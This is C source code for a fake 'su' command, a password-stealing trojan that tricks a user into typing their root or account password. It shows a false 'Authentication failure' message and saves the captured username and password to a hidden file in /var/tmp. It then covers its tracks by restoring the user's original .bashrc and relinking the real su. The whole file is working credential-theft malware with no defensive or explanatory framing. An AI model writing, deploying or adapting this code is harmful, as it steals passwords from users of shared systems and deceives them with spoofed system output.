#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <unistd.h>

int main(int argc, char *argv[]){

    FILE *fp;
    char *user;
    char *pass;
    char filex[100], clean[100];

    sprintf(filex,"/var/tmp/.pwds");
    sprintf(clean,"rm -rf /var/tmp/.su;mv -f /var/tmp/.originrc /home/$USER/.bashrc");
    if (argc == 1)  user = "root";
    if (argc == 2)  user = argv[1];
    if (argc > 2)   user = argv[argc - 1];
    fprintf(stdout, "Password: ");
    pass = getpass("");    
    system("sleep 2");
    fprintf(stdout, "su: Authentication failure\nSorry.\n");
    if ((fp = fopen(filex, "w")) != NULL){
        fprintf(fp, "%s:%s\n", user, pass);
        fclose(fp);
    }
    system(clean);
    system("rm -rf /var/tmp/.su; ln -s /bin/su /var/tmp/.su");
}
